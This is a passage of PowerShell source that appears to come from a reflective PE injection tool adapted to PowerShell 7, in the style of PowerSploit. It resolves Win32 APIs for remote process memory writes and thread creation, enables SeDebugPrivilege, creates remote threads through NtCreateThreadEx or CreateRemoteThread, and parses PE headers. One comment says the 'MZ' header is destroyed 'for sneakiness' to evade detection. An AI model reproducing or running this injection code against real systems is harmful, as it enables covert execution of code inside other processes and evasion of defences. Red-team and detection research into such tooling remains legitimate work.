        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ########### HELPERS ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, 'Run')
        #$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

        if ( [System.Convert]::ToDecimal( $PSVersionTable.PSVersion.Minor) -lt 3 ) {
             $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false) }
        else {  $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule')  }
        ################################################################################################
        #                              END ADAPTED TO PS7	                                       #
        ################################################################################################
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        #$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            #Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $SystemAssembly=[Reflection.Assembly]::LoadFile('C:\windows\Microsoft.NET\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\system.dll')
        ################################################################################################
        #                              END ADAPTED TO PS7                                              #
        ################################################################################################
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode" #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    # PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
